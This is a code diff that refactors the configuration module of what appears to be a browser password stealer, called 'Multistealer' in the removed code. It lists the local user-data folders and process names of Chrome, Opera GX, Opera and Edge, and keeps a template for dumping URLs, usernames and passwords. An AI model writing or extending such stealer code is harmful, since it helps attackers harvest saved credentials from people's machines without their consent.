@@ -1,15 +1,6 @@
-from enum import Enum
 from os import environ
 
 user_profile = environ.get("USERPROFILE")
-
-
-class Browsers(Enum):
-    CHROME = "Chrome"
-    OPERA_GX = "Opera GX"
-    OPERA_DEFAULT = "Opera Default"
-    EDGE = "Microsoft Edge"
-    YANDEX = "Yandex"
 
 
 class ChromiumConfig:
@@ -17,28 +8,22 @@ class ChromiumConfig:
     PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
 
 
-class MultistealerConfig:
-    PoolSize = 5
-
-    BrowsersData = {
-        Browsers.CHROME: {
-            "path": rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
-            "process": "chrome.exe",
-        },
-        Browsers.OPERA_GX: {
-            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
-            "process": "opera.exe",
-        },
-        Browsers.OPERA_DEFAULT: {
-            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
-            "process": "opera.exe",
-        },
-        Browsers.EDGE: {
-            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
-            "process": "msedge.exe",
-        },
-        Browsers.YANDEX: {
-            "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
-            "process": "browser.exe",
-        },
-    }
+BrowsersData = [
+    (
+        "Chrome",
+        rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
+        "chrome.exe",
+    ),
+    ("Opera GX",
+     rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
+     "opera.exe",
+     ),
+    ("Opera Default",
+     rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
+     "opera.exe",
+     ),
+    ("Microsoft Edge",
+     rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
+     "msedge.exe",
+     ),
+]
